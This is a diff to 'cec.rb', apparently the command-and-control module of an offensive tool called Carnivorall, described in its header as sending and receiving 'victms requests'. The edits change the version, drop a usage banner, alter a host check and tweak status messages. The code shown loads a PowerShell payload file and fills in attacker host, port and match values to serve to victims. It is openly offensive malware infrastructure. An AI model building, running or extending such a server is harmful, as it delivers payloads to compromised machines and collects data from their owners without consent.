@@ -3,8 +3,8 @@
 # Title           :cec.rb
 # Description     :Carnivorall module to send and receive victms requests
 # Authors         :L0stControl
-# Date            :2018/04/15
-# Version         :0.1.1    
+# Date            :2018/04/24
+# Version         :1.2.2
 # Dependecies     :ruby gems - colorize / sinatra / ipaddr
 #=========================================================================
 
@@ -20,15 +20,13 @@ match = ARGV[2]
 dstFolder = ARGV[3]
 lport = ARGV[4]
 
-banner = "\n Usage: LPORT=80 LHOST=192.168.1.1 FILE=/path/to/powershell.ps1 ./cec.rb"
-
 set :dump_errors, false
 set :raise_errors, false
 set :logging, false
 set :environment, :production
 set :show_exceptions, false
 
-if lhost != nil
+if lhost != "notset"
     if (IPAddr.new(lhost) rescue nil).nil?
         puts banner
         puts " [Error] Invalid IP address format #{lhost}".red
@@ -55,9 +53,10 @@ else
 end
 
 if file == "notset"
-    puts " [+]".green + " No Powershell payload defined, Listen Mode enable \n".white
+    puts " [+]".green + " No Powershell payload defined for GET requests, Listen Mode enable \n".white
 else 
-    begin 
+    begin
+        puts " [+]".green + " Listen Mode enable \n".white 
         scriptFile = File.open(file, "r")
         payload = scriptFile.read.gsub!("LHOST",lhost).gsub!("LPORT",lport).gsub!("MATCH",match)
         scriptFile.close
